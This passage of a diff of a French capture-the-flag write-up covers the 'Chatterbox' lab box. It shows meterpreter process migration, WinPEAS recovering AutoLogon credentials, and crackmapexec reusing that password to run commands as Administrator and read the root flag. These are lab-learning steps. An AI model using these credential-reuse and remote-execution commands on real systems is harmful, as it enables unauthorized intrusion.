+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="w">                                                               </span>e
+</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a><span class="w"> </span><span class="m">1104</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a><span class="w"> </span><span class="m">1236</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>spoolsv.exe
+</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="w"> </span><span class="m">1272</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a><span class="w"> </span><span class="m">1400</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>taskhost.exe<span class="w">    </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\t</span>askhost.ex
+</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="w">                                                               </span>e
+</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a><span class="w"> </span><span class="m">1424</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a><span class="w"> </span><span class="m">1504</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>sppsvc.exe
+</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a><span class="w"> </span><span class="m">1548</span><span class="w">  </span><span class="m">792</span><span class="w">   </span>dwm.exe<span class="w">         </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\D</span>wm.exe
+</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a><span class="w"> </span><span class="m">1572</span><span class="w">  </span><span class="m">1504</span><span class="w">  </span>explorer.exe<span class="w">    </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\E</span>xplorer.EXE
+</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a><span class="w"> </span><span class="m">1696</span><span class="w">  </span><span class="m">1572</span><span class="w">  </span>vm3dservice.ex<span class="w">  </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\v</span>m3dservice
+</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a><span class="w">             </span>e<span class="w">                                                 </span>.exe
+</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a><span class="w"> </span><span class="m">1704</span><span class="w">  </span><span class="m">1572</span><span class="w">  </span>vmtoolsd.exe<span class="w">    </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\V</span>Mware<span class="se">\V</span>Mware
+</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a><span class="w">                                                               </span>Tools<span class="se">\v</span>mtoolsd.exe
+</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a><span class="w"> </span><span class="m">1824</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>VGAuthService.
+</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a><span class="w">             </span>exe
+</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a><span class="w"> </span><span class="m">1852</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>vmtoolsd.exe
+</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a><span class="w"> </span><span class="m">1872</span><span class="w">  </span><span class="m">312</span><span class="w">   </span>conhost.exe
+</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a><span class="w"> </span><span class="m">2100</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>dllhost.exe
+</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a><span class="w"> </span><span class="m">2160</span><span class="w">  </span><span class="m">576</span><span class="w">   </span>WmiPrvSE.exe
+</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a><span class="w"> </span><span class="m">2344</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>msdtc.exe
+</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a><span class="w"> </span><span class="m">2540</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>SearchIndexer.
+</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a><span class="w">             </span>exe
+</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a><span class="w"> </span><span class="m">2752</span><span class="w">  </span><span class="m">3052</span><span class="w">  </span>AChat.exe<span class="w">       </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>c:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\A</span>Chat<span class="se">\A</span>Chat.ex
+</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59" href="#__codelineno-4-59"></a><span class="w">                                                               </span>e
+</span><span id="__span-4-60"><a id="__codelineno-4-60" name="__codelineno-4-60" href="#__codelineno-4-60"></a><span class="w"> </span><span class="m">3164</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-61"><a id="__codelineno-4-61" name="__codelineno-4-61" href="#__codelineno-4-61"></a><span class="w"> </span><span class="m">3188</span><span class="w">  </span><span class="m">920</span><span class="w">   </span>taskeng.exe<span class="w">     </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\t</span>askeng.exe
+</span><span id="__span-4-62"><a id="__codelineno-4-62" name="__codelineno-4-62" href="#__codelineno-4-62"></a><span class="w"> </span><span class="m">3316</span><span class="w">  </span><span class="m">576</span><span class="w">   </span>WmiPrvSE.exe
+</span><span id="__span-4-63"><a id="__codelineno-4-63" name="__codelineno-4-63" href="#__codelineno-4-63"></a><span class="w"> </span><span class="m">3836</span><span class="w">  </span><span class="m">576</span><span class="w">   </span>dllhost.exe<span class="w">     </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\D</span>llHost.exe
+</span><span id="__span-4-64"><a id="__codelineno-4-64" name="__codelineno-4-64" href="#__codelineno-4-64"></a><span class="w"> </span><span class="m">3860</span><span class="w">  </span><span class="m">456</span><span class="w">   </span>CompatTelRunne
+</span><span id="__span-4-65"><a id="__codelineno-4-65" name="__codelineno-4-65" href="#__codelineno-4-65"></a><span class="w">             </span>r.exe
+</span></code></pre></div>
 <p>Impeccable. Je vois par exemple le PID 288, je tente donc de relancer l'exploit et de migrer très vite vers ce PID pour voir si mon shell se stabilise:</p>
-<pre><code class="language-bash">meterpreter &gt; migrate 288
-[*] Migrating from 3816 to 288...
-[*] Migration completed successfully.
-meterpreter &gt; 
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>migrate<span class="w"> </span><span class="m">288</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Migrating<span class="w"> </span>from<span class="w"> </span><span class="m">3816</span><span class="w"> </span>to<span class="w"> </span><span class="m">288</span>...
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Migration<span class="w"> </span>completed<span class="w"> </span>successfully.
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>
+</span></code></pre></div>
 <p>Ca fonctionne, mon shell semble être stable. </p>
-<pre><code class="language-bash">C:\Windows\system32&gt;whoami /all
-whoami /all
-
-USER INFORMATION
-----------------
-
-User Name         SID                                          
-================= =============================================
-chatterbox\alfred S-1-5-21-1218242403-4263168573-589647361-1000
-
-
-GROUP INFORMATION
------------------
-
-Group Name                             Type             SID          Attributes                                        
-====================================== ================ ============ ==================================================
-Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
-CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
-LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group
-
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                          State   
-============================= ==================================== ========
-SeShutdownPrivilege           Shut down the system                 Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
-SeUndockPrivilege             Remove computer from docking station Disabled
-SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
-SeTimeZonePrivilege           Change the time zone                 Disabled
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami<span class="w"> </span>/all
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>whoami<span class="w"> </span>/all
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>USER<span class="w"> </span>INFORMATION
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>----------------
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>User<span class="w"> </span>Name<span class="w">         </span><span class="nv">SID</span><span class="w">                                          </span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="o">=================</span><span class="w"> </span><span class="o">=============================================</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>chatterbox<span class="se">\a</span>lfred<span class="w"> </span>S-1-5-21-1218242403-4263168573-589647361-1000
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>GROUP<span class="w"> </span>INFORMATION
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>-----------------
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>Group<span class="w"> </span>Name<span class="w">                             </span>Type<span class="w">             </span>SID<span class="w">          </span><span class="nv">Attributes</span><span class="w">                                        </span>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="o">======================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>Everyone<span class="w">                               </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-1-0<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>BUILTIN<span class="se">\U</span>sers<span class="w">                          </span>Alias<span class="w">            </span>S-1-5-32-545<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\I</span>NTERACTIVE<span class="w">               </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-4<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>CONSOLE<span class="w"> </span>LOGON<span class="w">                          </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-2-1<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users<span class="w">       </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-11<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\T</span>his<span class="w"> </span>Organization<span class="w">         </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-15<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\L</span>ocal<span class="w"> </span>account<span class="w">             </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-113<span class="w">    </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>LOCAL<span class="w">                                  </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-2-0<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>TLM<span class="w"> </span>Authentication<span class="w">       </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-64-10<span class="w">  </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>Mandatory<span class="w"> </span>Label<span class="se">\M</span>edium<span class="w"> </span>Mandatory<span class="w"> </span>Level<span class="w"> </span>Label<span class="w">            </span>S-1-16-8192<span class="w">  </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
+</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
+</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>
+</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>PRIVILEGES<span class="w"> </span>INFORMATION
+</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>----------------------
+</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>
+</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                          </span><span class="nv">State</span><span class="w">   </span>
+</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a><span class="o">=============================</span><span class="w"> </span><span class="o">====================================</span><span class="w"> </span><span class="o">========</span>
+</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>SeShutdownPrivilege<span class="w">           </span>Shut<span class="w"> </span>down<span class="w"> </span>the<span class="w"> </span>system<span class="w">                 </span>Disabled
+</span><span id="__span-6-35"><a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">             </span>Enabled<span class="w"> </span>
+</span><span id="__span-6-36"><a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>SeUndockPrivilege<span class="w">             </span>Remove<span class="w"> </span>computer<span class="w"> </span>from<span class="w"> </span>docking<span class="w"> </span>station<span class="w"> </span>Disabled
+</span><span id="__span-6-37"><a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w">       </span>Disabled
+</span><span id="__span-6-38"><a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>SeTimeZonePrivilege<span class="w">           </span>Change<span class="w"> </span>the<span class="w"> </span><span class="nb">time</span><span class="w"> </span>zone<span class="w">                 </span>Disabled
+</span></code></pre></div>
 <p>Un déplacement sur le desktop de l'utilisateur: le flag est là, comme attendu.</p>
 <h3 id="devenons-root">Devenons root</h3>
 <p>Et là... J'ai pas trop d'idées. Je fais un peu le tour du système, je ne vois pas grand chose. Un petit WinPEAS ? Aller.</p>
 <p>Bingo.</p>
-<pre><code class="language-powershell">����������͹ Looking for AutoLogon credentials
-    Some AutoLogon credentials were found
-    DefaultUserName               :  Alfred
-    DefaultPassword               :  Welcome1!
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="err">����������͹</span> <span class="n">Looking</span> <span class="k">for</span> <span class="n">AutoLogon</span> <span class="n">credentials</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    <span class="n">Some</span> <span class="n">AutoLogon</span> <span class="n">credentials</span> <span class="n">were</span> <span class="n">found</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    <span class="n">DefaultUserName</span>               <span class="p">:</span>  <span class="n">Alfred</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    <span class="n">DefaultPassword</span>               <span class="p">:</span>  <span class="n">Welcome1</span><span class="p">!</span>
+</span></code></pre></div>
 <p>Bon, c'est mon utilisateur actuel, certe, mais ça risque de me permettre de tenter quelques trucs sur le SMB qui semble ouvert.</p>
-<pre><code class="language-bash">┌──(pak㉿kali)-[~]
-└─$ crackmapexec smb 10.10.10.74 -u Alfred -p 'Welcome1!'       
-SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
-SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Alfred:Welcome1! 
-
-┌──(pak㉿kali)-[~]
-└─$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!'
-SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
-SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>┌──<span class="o">(</span>pak㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>└─$<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.74<span class="w"> </span>-u<span class="w"> </span>Alfred<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome1!&#39;</span><span class="w">       </span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">7601</span><span class="w"> </span>Service<span class="w"> </span>Pack<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>name:CHATTERBOX<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:Chatterbox<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:False<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Chatterbox<span class="se">\A</span>lfred:Welcome1!<span class="w"> </span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>┌──<span class="o">(</span>pak㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>└─$<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.74<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome1!&#39;</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">7601</span><span class="w"> </span>Service<span class="w"> </span>Pack<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>name:CHATTERBOX<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:Chatterbox<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:False<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Chatterbox<span class="se">\A</span>dministrator:Welcome1!<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></code></pre></div>
 <p>AH ! D'accord. Bah je n'y croyais pas forcément, mais il s'agit de password-reuse. Je suis root.</p>
-<pre><code class="language-bash">┌──(pak㉿kali)-[~]
-└─$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'dir C:\Users\Administrator\Desktop'
-SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
-SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
-SMB         10.10.10.74     445    CHATTERBOX       [+] Executed command 
-SMB         10.10.10.74     445    CHATTERBOX       Volume in drive C has no label.
-SMB         10.10.10.74     445    CHATTERBOX       Volume Serial Number is 502F-F304
-SMB         10.10.10.74     445    CHATTERBOX       
-SMB         10.10.10.74     445    CHATTERBOX       Directory of C:\Users\Administrator\Desktop
-SMB         10.10.10.74     445    CHATTERBOX       
-SMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    &lt;DIR&gt;          .
-SMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    &lt;DIR&gt;          ..
-SMB         10.10.10.74     445    CHATTERBOX       09/07/2023  08:25 PM                34 root.txt
-SMB         10.10.10.74     445    CHATTERBOX       1 File(s)             34 bytes
-SMB         10.10.10.74     445    CHATTERBOX       2 Dir(s)   3,311,423,488 bytes free
-
-┌──(pak㉿kali)-[~]
-└─$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'type C:\Users\Administrator\Desktop\root.txt'
-SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
-SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
-SMB         10.10.10.74     445    CHATTERBOX       [+] Executed command 
-SMB         10.10.10.74     445    CHATTERBOX       ce4b046919fe296c########8be1
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>┌──<span class="o">(</span>pak㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>└─$<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.74<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome1!&#39;</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;dir C:\Users\Administrator\Desktop&#39;</span>
